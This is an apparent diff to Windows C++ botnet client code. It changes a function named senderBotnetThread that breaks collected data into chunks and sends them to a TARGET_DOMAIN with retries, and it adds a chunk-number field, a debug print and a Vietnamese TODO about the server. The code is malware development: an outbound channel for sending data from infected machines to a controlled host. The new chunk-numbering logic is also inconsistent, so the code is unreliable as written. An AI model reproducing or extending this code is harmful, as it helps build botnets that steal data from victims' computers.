@@ -28,13 +28,15 @@ DWORD senderBotnetThread(LPVOID lpParam)
         if (!dataToSend.empty()) {
             // Split dataToSend into chunks of MaxLen and send each chunk
             size_t offset = 0;
+            size_t offset_number = 0;
             const size_t totalLen = dataToSend.size();
-
             while (offset < totalLen) {
                 size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                 std::string chunk = dataToSend.substr(offset, chunkLen);
-
-                int success = sendDataTypeC(connectionId, packet_number,
+                offset_number = offset % max_len;
+                std::cout << packet_number;
+                // TODO: kiem tra lai cho nay khi sua xong server
+                int success = sendDataTypeC(connectionId, packet_number, offset_number,
                                             TARGET_DOMAIN.c_str(), chunk.c_str());
 
                 if (success == 0) {
@@ -45,7 +47,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
                     }
 
                     offset += chunkLen;
-
+                    offset_number += 1;
                     Sleep(10);
                 } else {
                     // Re-enqueue remaining data
